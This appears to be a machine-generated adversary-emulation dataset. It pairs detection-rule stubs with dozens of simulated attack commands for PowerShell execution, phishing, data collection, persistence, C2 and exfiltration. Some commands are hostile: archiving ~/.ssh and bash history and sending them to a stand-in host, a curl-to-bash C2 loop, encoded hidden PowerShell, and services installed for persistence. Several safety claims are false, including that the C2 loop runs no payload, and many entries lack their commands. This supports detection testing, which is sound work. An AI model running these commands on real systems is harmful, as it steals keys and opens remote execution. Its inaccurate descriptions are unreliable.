extracted_ttps.description: Attacker used PowerShell to execute malicious scripts
Attacker used phishing to gain initial access
Attacker used social engineering to trick victims into executing malicious files
Attacker collected data from local systems using malicious scripts

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: Attacker exfiltrated data over command and control channels
Detected Phishing activity via NLP pattern matching
Detected PowerShell activity via NLP pattern matching
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching

rules.title: Execution of Malicious PowerShell Scripts
rules.description: Detects execution of PowerShell with known malicious script names indicative of attacker activity.
falsepositives: Legitimate administrative scripts using temporary or generic names (e.g., temp.ps1) in non-standard paths
Developers or testers running scripts with common names in isolated environments

rules.title: Office Application Spawning Command Shell
rules.description: Detects Office applications spawning command-line interpreters, a common technique used in phishing attacks to execute malicious payloads.
falsepositives: Legitimate use of Office automation that spawns command-line tools (rare)
Administrative or developer scripts initiated from Office documents in specialized environments

rules.title: Suspicious User Execution via LNK or ZIP File
rules.description: Detects user execution of malicious LNK or ZIP files commonly used in social engineering attacks. Looks for process chains where scripts or command-line tools execute files with .lnk or .zip extensions in user-accessible directories.
falsepositives: Legitimate use of ZIP files in automated scripts or software installers
Administrative scripts that use LNK files for shortcut execution in user contexts

rules.title: Data Collection from Local System via Script
rules.description: Detects potential data collection from the local system using scripting engines such as PowerShell, WSH, or command-line tools. This may indicate adversary use of malicious scripts to gather sensitive information prior to exfiltration.
falsepositives: Legitimate administrative scripts that enumerate system information or copy user data
Backup or monitoring tools that access user directories or run system commands
User-initiated command-line data listing or network configuration checks

rules.title: Detection: Exfiltration Over Command and Control Channel
rules.description: Attacker exfiltrated data over command and control channels
falsepositives: Legitimate administrative activity
rules.technique_name: Exfiltration Over Command and Control Channel

rules.title: PowerShell Execution Detection
rules.description: Detects PowerShell execution activity via process creation events
falsepositives: Legitimate administrative tasks
Scripting activities
PowerShell-based software installations

rules.title: Create or Modify System Process Detection
rules.description: Detects Create or Modify System Process activity via NLP pattern matching
falsepositives: Legitimate system process creation
Software installation or updates

rules.title: Detection: Application Layer Protocol
rules.description: Detected Application Layer Protocol activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Detection: Obfuscated Files or Information
rules.description: Detected Obfuscated Files or Information activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Exploit Public-Facing Application
rules.description: Detects exploitation of public-facing applications via command line analysis
falsepositives: Legitimate administration tasks
Penetration testing activities

rules.title: Archive Collected Data via Command-Line Archiving Tools
rules.description: Detects potential archiving of collected data using command-line tools such as zip, rar, 7z, makecab, or PowerShell Compress-Archive. This activity is often observed prior to data exfiltration in collection phases.
falsepositives: Legitimate software packaging or backup scripts
Administrative tasks involving compression of logs or configuration files
Development environments building deployable archives

attacks.command: powershell -Command "Write-Output 'Test payload execution via PowerShell' | Out-File -FilePath $env:TEMP\\test_exec.txt"
attacks.description: Basic PowerShell command execution writing a test string to a file in TEMP
attacks.expected_behavior: Creates a file 'test_exec.txt' in the user's TEMP directory with the content 'Test payload execution via PowerShell'

attacks.description: Intermediate: Execute a Base64-encoded PowerShell command that sleeps for 5 seconds then exits cleanly
attacks.expected_behavior: PowerShell decodes and runs the command: Start-Sleep -Seconds 5; Exit 0. Simulates delayed execution pattern seen in malware.

attacks.description: Advanced: Use cmd.exe to trigger PowerShell script staging and execution with hidden window style
attacks.expected_behavior: Creates a PowerShell script in TEMP that launches notepad.exe hidden, then executes it. Demonstrates script staging and stealthy execution.

attacks.description: Creates a benign PowerShell script file in /tmp using Set-Content with Force to overwrite if exists
attacks.expected_behavior: A file /tmp/test_script.ps1 is created with a simple output command. No elevated privileges needed. Silent on success.

attacks.description: Executes the previously created PowerShell script from /tmp
attacks.expected_behavior: Runs the script and outputs 'Hello from test script' to stdout. Requires pwsh to be installed and script to exist.

attacks.description: Cleans up by removing the test script file with silent error handling
attacks.expected_behavior: Deletes the script file if it exists. No error output if file is missing or deletion fails.

attacks.command: echo "This is a benign phishing email simulation" > %TEMP%\phish_test.txt
attacks.description: Basic phishing simulation by creating a text file in the temp directory
attacks.expected_behavior: A text file named phish_test.txt will be created in the user's temp directory.

attacks.description: Intermediate phishing simulation using PowerShell to display a message box
attacks.expected_behavior: A message box will pop up with the text 'You have been phished.'

attacks.description: Advanced phishing simulation by downloading and executing a benign file
attacks.expected_behavior: A benign file will be downloaded from a specified URL and executed. The file should be harmless and used only for testing purposes.

attacks.command: echo '#!/bin/sh' > $HOME/phishing_sim.sh && echo 'echo "Simulated phishing payload execution"' >> $HOME/phishing_sim.sh && chmod +x $HOME/phishing_sim.sh && $HOME/phishing_sim.sh
attacks.description: Basic simulation of a phishing payload that creates and executes a local shell script
attacks.expected_behavior: Creates a harmless shell script in the user's home directory, makes it executable, and runs it. Output: 'Simulated phishing payload execution'

attacks.description: Intermediate simulation: creates a hidden phishing-like script in a cache directory and sources it
attacks.expected_behavior: Creates a script in a hidden cache folder, sets execute permissions, and sources it to simulate execution from phishing. Output: 'Phishing payload triggered'

attacks.command: echo 'echo "Phishing simulation: command execution via downloaded file"' | at now + 1 minute
attacks.description: Advanced simulation: schedules a benign command to run later using 'at', mimicking delayed execution from phishing
attacks.expected_behavior: Schedules a message to be printed one minute from now. Requires the 'at' daemon to be running. Output appears in the user's session after delay.

attacks.description: Download and execute a file using certutil and start command. Simulates user launching a downloaded 'software update'.
attacks.expected_behavior: Downloads a file from a local server (simulated) to the temp directory and executes it. The 'start' command launches the file as a separate process. In a real attack, this would be a malicious executable; here, it's safe for testing.

attacks.description: Create a batch file that runs calc.exe and execute it with elevated privileges using PowerShell Start-Process.
attacks.expected_behavior: Creates a batch file in temp directory that runs calc.exe. Then uses PowerShell to launch it with administrator privileges. Simulates user executing a 'patch' script that requires elevation. Triggers UAC prompt in real environment.

attacks.command: powershell -Command "mkdir '%TEMP%\WindowsUpdate' -ErrorAction SilentlyContinue; Set-Content -Path '%TEMP%\WindowsUpdate\installer.lnk' -Value 'This is a fake installer' -Force; Invoke-Item '%TEMP%\WindowsUpdate\installer.lnk'"
attacks.description: Create a fake installer link in temp directory and open it, simulating user double-clicking a file.
attacks.expected_behavior: Creates a directory and a fake link file, then opens it with the default handler (e.g., Notepad). Simulates user interaction with a disguised malicious file. No actual payload is executed.

attacks.description: Download and execute a script via curl, simulating a fake system update.
attacks.expected_behavior: Downloads a script from a remote server, makes it executable, and runs it. The script could be malicious in real attacks, but here it would only perform benign actions if present.

attacks.description: Decodes and executes an obfuscated script from base64, simulating a stealthy payload delivery.
attacks.expected_behavior: Decodes a base64-encoded bash script into a hidden file in /tmp, makes it executable, and runs it. The script prints a message and sleeps, mimicking benign behavior.

attacks.description: Executes a self-deleting payload that runs and then removes itself, simulating advanced evasion.
attacks.expected_behavior: Decodes a script that prints a message and deletes itself. This simulates a transient malicious payload that leaves minimal traces after execution.

attacks.description: Collects network configuration information and saves it to a file in the temp directory.
attacks.expected_behavior: The command executes without prompting the user, saving network configuration details to a file named system_info.txt in the temp directory.

attacks.description: Uses PowerShell to get local user accounts and their descriptions, then saves this information to a file.
attacks.expected_behavior: The command runs silently, collecting local user account information and saving it to a file named local_users.txt in the temp directory.

attacks.description: Collects detailed user information, including privileges, and saves it to a file.
attacks.expected_behavior: The command executes without user interaction, saving detailed user information to a file named user_info.txt in the temp directory.

attacks.description: Basic data collection: lists home directory contents and saves to a temporary file
attacks.expected_behavior: Outputs a list of files and permissions in /home to /tmp/user_dirs.txt. Fails silently if /home is not readable.

attacks.description: Intermediate data collection: finds common document files in home directories and limits output to 50 results
attacks.expected_behavior: Searches for text, PDF, and Word-like files in /home, outputs up to 50 matches to /tmp/local_documents.txt. Uses head to avoid excessive output.

attacks.description: Advanced data collection: archives critical system and user files into a compressed timestamped file
attacks.expected_behavior: Creates a compressed tarball in /tmp containing user history files, desktop text files, and system account information. If some files are inaccessible, the command continues and creates a partial archive.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration: captures network configuration and uploads via certutil POST request
attacks.expected_behavior: Creates netinfo.txt in temp folder, sends it via HTTP POST to 127.0.0.1:8080/upload using certutil, then deletes the file. No admin rights needed. Uses only built-in tools.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: ipconfig /all > "%TEMP%\netinfo.txt" && powershell -Command "Compress-Archive -Path '%TEMP%\netinfo.txt' -DestinationPath '%TEMP%\data.zip' -Force; Invoke-WebRequest -Uri http://127.0.0.1:8080/upload -Method POST -InFile '%TEMP%\data.zip'; Remove-Item '%TEMP%\data.zip' -Force -ErrorAction SilentlyContinue"
attacks.description: Intermediate exfiltration: compresses system data into ZIP and uploads via PowerShell
attacks.expected_behavior: Generates network info, compresses it into data.zip, uploads via HTTP POST, then cleans up. Uses Compress-Archive with -Force safely. Remove-Item includes error handling. No sensitive data accessed.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: powershell -Command "ipconfig /all | Out-File -FilePath '%TEMP%\diag.txt'; $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP%\diag.txt')); $body = @{data=$encoded}; Invoke-WebRequest -Uri http://127.0.0.1:8080/exfil -Method POST -Body ($body | ConvertTo-Json); Remove-Item '%TEMP%\diag.txt' -ErrorAction SilentlyContinue"
attacks.description: Advanced exfiltration: encodes collected data in Base64 and sends as JSON payload
attacks.expected_behavior: Captures ipconfig output, reads it as bytes, Base64-encodes, and sends in a JSON POST request. Simulates data encoding seen in real C2 traffic. Uses only built-in PowerShell cmdlets. No .NET direct invocation. File cleanup with error suppression.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration using netcat to stream the user's bash history to a remote listener acting as the C2 channel.
attacks.expected_behavior: The contents of $HOME/.bash_history are sent over TCP to 192.0.2.10 on port 4444, where a netcat listener would receive the data.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: tar -czf - $HOME/.ssh | base64 | curl -X POST -H "Content-Type: application/octet-stream" -d @- http://192.0.2.10:8080/exfil
attacks.description: Intermediate exfiltration: archive the user's .ssh directory, base64‑encode it, and POST the data to a remote HTTP endpoint representing a C2 server.
attacks.expected_behavior: A tarball of $HOME/.ssh is created in memory, encoded, and sent via an HTTP POST request to http://192.0.2.10:8080/exfil. The remote server would receive the encoded archive.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced exfiltration: combine multiple system files into a compressed archive and transfer it over an encrypted SSH session to the C2 host.
attacks.expected_behavior: The tarball containing /etc/passwd and /etc/hosts is streamed over SSH to user@192.0.2.10, where it is written to /tmp/system_info.tar.gz. The remote host receives the archive securely.

attacks.description: Basic PowerShell command writing a test string to a file in the temp directory.
attacks.expected_behavior: Creates a file 'test_ps_exec.txt' in the user's temp directory with the content 'Test execution via PowerShell'. No elevated privileges needed.

attacks.description: Intermediate: Executes a Base64-encoded PowerShell command that sleeps for 5 seconds then exits cleanly.
attacks.expected_behavior: PowerShell decodes and runs the command: 'Start-Sleep -Seconds 5; Exit 0'. Simulates delay often seen in malicious scripts. No file system changes. Safe and self-terminating.

attacks.command: powershell -Command "mkdir '$env:TEMP\\_tmp_ps' -ErrorAction SilentlyContinue; $out = '$env:TEMP\\_tmp_ps\\ipconfig.txt'; ipconfig.exe | Out-File -FilePath $out -Force; certutil.exe -hashfile $out SHA256"
attacks.description: Advanced: PowerShell orchestrates directory creation, runs legacy binary (ipconfig), saves output, and hashes it using certutil.
attacks.expected_behavior: Creates a temp subdirectory, captures network config via ipconfig.exe, saves to file, and computes hash. Demonstrates PowerShell coordinating multiple built-in tools—realistic post-execution behavior. Cleanup not performed to simulate artifact creation, but no destructive actions.

attacks.description: Download a PowerShell script from a remote server using Invoke-WebRequest
attacks.expected_behavior: Attempts to download a file from http://example.com/test to /tmp/test.ps1. Fails silently if network is unavailable or file cannot be written.

attacks.command: pwsh -Command "Set-Content -Path '$env:TEMP/run.ps1' -Value 'Write-Output \"Hello from test payload\"' -Force; & '$env:TEMP/run.ps1'; Remove-Item '$env:TEMP/run.ps1' -ErrorAction SilentlyContinue"
attacks.description: Create a local PowerShell script, execute it, and remove it
attacks.expected_behavior: Creates a script in /tmp that outputs a test string, executes it, and deletes the file. Simulates inline script execution and cleanup.

attacks.command: pwsh -Command "$payload = 'Write-Output \"Beaconing every 30 seconds\"'; $scriptPath = '$env:TEMP/daemon.ps1'; Set-Content -Path $scriptPath -Value $payload -Force; while ($true) { & $scriptPath; Start-Sleep -Seconds 30 }"
attacks.description: Establish a persistent loop executing a local script at intervals to simulate beaconing behavior
attacks.expected_behavior: Writes a test script to /tmp/daemon.ps1 and runs it in an infinite loop with 30-second delays. Demonstrates long-running PowerShell activity and periodic execution.

attacks.description: Lists all running services, which can be used to identify potential system processes to modify
attacks.expected_behavior: Displays a list of running services

attacks.command: sc create MyService binPath= "C:\\Windows\\System32\\svchost.exe -k netsvcs" type= own start= auto
attacks.description: Creates a new service that runs svchost.exe, demonstrating the creation of a system process
attacks.expected_behavior: Creates a new service that runs svchost.exe

attacks.description: Starts the Task Manager with a specific configuration, demonstrating the modification of a system process
attacks.expected_behavior: Starts the Task Manager with a specific configuration

attacks.description: Adds a cron job that runs a benign command at system reboot using crontab.
attacks.expected_behavior: A user-level cron job is installed and will execute once at next reboot, writing a test message to /tmp/persistence.log.

attacks.command:
printf '[Unit]
Description=Test Persistence Service
[Service]
ExecStart=/bin/sh -c "while true; do echo "keep-alive" >> /tmp/service.log; sleep 60; done"
[Install]
WantedBy=multi-user.target' > /tmp/test-persistence.service && sudo mv /tmp/test-persistence.service /etc/systemd/system/ && sudo systemctl enable test-persistence.service && sudo systemctl start test-persistence.service
attacks.description: Creates and enables a custom systemd service that runs a persistent loop logging to a file.
attacks.expected_behavior: A new systemd service is created, enabled to start at boot, and started immediately. It logs a message every 60 seconds to /tmp/service.log.

attacks.command: echo 'sleep 20 && /bin/bash -c "echo \\"background persistence task\\" | at now"' > /tmp/persistence-at.sh && chmod +x /tmp/persistence-at.sh && /tmp/persistence-at.sh &
attacks.description: Schedules a delayed one-time execution of a command using 'at' via a backgrounded script.
attacks.expected_behavior: A script is created and executed in the background that schedules a future task using 'at' to write a message to stdout (may be logged). The task runs once after 20 seconds.

attacks.description: Basic HTTP GET request using certutil to simulate beaconing behavior
attacks.expected_behavior: Downloads a test response from httpbin.org, displays it, then deletes the file. Simulates beaconing over HTTPS using a built-in tool.

attacks.command: powershell -Command "try { $url = 'https://httpbin.org/post'; $data = @{ action = 'heartbeat'; id = 'test123' }; $res = Invoke-WebRequest -Uri $url -Method POST -Body $data -ContentType 'application/x-www-form-urlencoded' -TimeoutSec 30; Write-Output $res.Content } catch { Write-Error 'Request failed' }"
attacks.description: Intermediate HTTPS POST request with form data using PowerShell to simulate C2 communication
attacks.expected_behavior: Sends a small POST request with test data to httpbin.org and outputs the response. Simulates data exfiltration attempt using encrypted channel.

attacks.command: cmd.exe /c "mkdir '%TEMP%\\_tmp' 2>nul && echo [SystemInfo] Host=%COMPUTERNAME% ^& Time=%TIME% > '%TEMP%\\_tmp\\diag.dat' && powershell -Command \"Compress-Archive -Path '%TEMP%\\_tmp\\diag.dat' -DestinationPath '%TEMP%\\_tmp\\diag.zip' -Force\" && certutil.exe -urlcache -f -split https://httpbin.org/post '%TEMP%\\_tmp\\diag.zip' && del /q '%TEMP%\\_tmp'\\*.* && rmdir '%TEMP%\\_tmp'"
attacks.description: Advanced simulated data collection and exfiltration using compression and HTTP upload attempt via certutil
attacks.expected_behavior: Creates a temporary diagnostic file, compresses it, attempts to 'upload' via certutil (will fail but generate POST), then cleans up. Demonstrates multi-stage protocol use with cleanup.

attacks.description: Basic HTTP GET request to simulate beaconing to C2 server
attacks.expected_behavior: Sends a GET request to example.com, downloads response to /tmp/stage1. No data exfiltration occurs. Uses standard curl tool available on most Linux systems.

attacks.description: Intermediate POST request with simulated data exfiltration
attacks.expected_behavior: Sends a POST request with dummy data to example.com/log. Simulates exfiltration via HTTP POST. Data is not real and sent to a benign domain.

attacks.command: while true; do curl -s http://example.com/cmd | bash 2>&1 | curl -X POST --data-binary @- http://example.com/out; sleep 60; done
attacks.description: Advanced C2-like loop: fetches commands, executes, and sends output back over HTTP
attacks.expected_behavior: Enters a loop that retrieves commands from example.com/cmd, executes them locally, and posts output back to example.com/out every 60 seconds. Simulates persistent C2 behavior. Uses only built-in shell and curl. No actual payload is executed.

attacks.description: Decodes a Base64 string using certutil, a common obfuscation technique on Windows.
attacks.expected_behavior: Creates a file at $env:TEMP\decoded.txt containing the decoded text 'test cmd'. Uses built-in certutil for decoding, simulating obfuscated payload extraction.

attacks.command: echo 'echo hello' | powershell -Command "$_ | Out-String | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_)) }" | %ComSpec% /c "set /p cmd= & certutil -decode - $env:TEMP\cmd.bat & start $env:TEMP\cmd.bat"
attacks.description: Chains PowerShell Base64 encoding with certutil decoding and execution via cmd, demonstrating multi-stage obfuscation.
attacks.expected_behavior: Encodes 'echo hello' in Base64 via PowerShell, decodes it to $env:TEMP\cmd.bat using certutil, and executes it in a new window. Simulates staged obfuscated command execution using only built-in tools.

attacks.command: powershell -Command "try { $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output \"Obfuscated execution test\"')); Start-Process powershell -ArgumentList '-EncodedCommand', $enc -WindowStyle Hidden } catch { exit 1 }"
attacks.description: Executes a Base64-encoded PowerShell command to simulate obfuscated code execution.
attacks.expected_behavior: Runs a hidden PowerShell instance that executes an encoded command displaying 'Obfuscated execution test'. Uses standard PowerShell cmdlets and proper UTF-16LE encoding, mimicking real obfuscation techniques safely.

attacks.description: Basic obfuscation: stores a Base64‑encoded command in a hidden file, decodes it, makes it executable, and runs it.
attacks.expected_behavior: Creates $HOME/.obf.sh containing "echo 'Hello, world!'", executes it, and prints "Hello, world!" to the console.

attacks.command: gzip -c <<< 'echo "Secret data"' | base64 > $HOME/.payload.b64 && base64 -d $HOME/.payload.b64 | gzip -d > $HOME/.payload.sh && chmod +x $HOME/.payload.sh && $HOME/.payload.sh
attacks.description: Intermediate obfuscation: compresses a script with gzip, encodes the compressed data in Base64, stores it, then decodes and decompresses at runtime before execution.
attacks.expected_behavior: Creates $HOME/.payload.sh containing "echo \"Secret data\"", runs it, and prints "Secret data". The intermediate .b64 file holds the compressed, encoded payload.

attacks.description: Advanced obfuscation: writes a script using hexadecimal escape sequences for each character, creating a hidden executable that prints an obfuscated message.
attacks.expected_behavior: Generates $HOME/.obf2.sh with a shebang and an echo command, makes it executable, runs it, and outputs "Obfuscated message".

attacks.description: Downloads a benign payload from a hypothetical public-facing application using certutil, mimicking the exploitation of a vulnerable application.
attacks.expected_behavior: The command downloads the benign payload to the temporary directory without executing it, demonstrating the initial access technique.

attacks.description: Uses PowerShell to download a benign PowerShell script from a public-facing application, simulating the exploitation of a vulnerable application.
attacks.expected_behavior: The command downloads the benign PowerShell script to the temporary directory without executing it, demonstrating the initial access technique.

attacks.description: Creates a benign text file in the temporary directory using cmd.exe, simulating the creation of a payload by an exploited public-facing application.
attacks.expected_behavior: The command creates a text file named 'benign_payload.txt' in the temporary directory, demonstrating the potential aftermath of exploiting a public-facing application.

attacks.description: Basic command to simulate exploitation of a public-facing application using curl
attacks.expected_behavior: Simulates an HTTP GET request to a public-facing application with a potential exploit parameter

attacks.description: Intermediate command to simulate exploitation of a public-facing application using wget
attacks.expected_behavior: Simulates an HTTP GET request to a public-facing application with a potential exploit parameter, discarding the response

attacks.description: Advanced command to simulate exploitation of a public-facing application using curl with JSON payload
attacks.expected_behavior: Simulates an HTTP POST request to a public-facing application with a JSON payload containing a potential exploit parameter

attacks.description: Uses built-in makecab.exe to archive a collected data file into a CAB archive.
attacks.expected_behavior: Creates a compressed CAB file named collected_data.cab in %TEMP% from debug.log. If debug.log does not exist, makecab will create an empty archive with a warning.

attacks.description: Uses PowerShell Compress-Archive to zip all files in a logs directory into archive.zip.
attacks.expected_behavior: If the directory %TEMP%\logs exists and contains files, they are compressed into archive.zip in %TEMP%. The -Force parameter overwrites the destination if it exists.

attacks.description: Creates a directory, copies a benign system file into it, and uses built-in tar to create a compressed archive.
attacks.expected_behavior: Creates a directory exfil_data in %TEMP%, copies license.rtf into it, then creates a gzipped tar archive data.tar.gz containing the contents. Modern Windows systems include tar via Windows Subsystem for Windows.

attacks.description: Basic archiving of collected data using tar
attacks.expected_behavior: Creates a tar archive named exfiltrate.tar in /tmp containing the contents of /tmp/collected_data/

attacks.description: Intermediate: Compress collected data into a gzipped tar archive
attacks.expected_behavior: Changes to the collected_data directory and creates a compressed tar.gz archive in /tmp, reducing size for potential exfiltration

attacks.description: Advanced: Selectively archive files while excluding system-like directories, then compress
attacks.expected_behavior: Finds regular files in collected_data, skips pseudo-system paths, appends them to an archive, then compresses the final tar with gzip
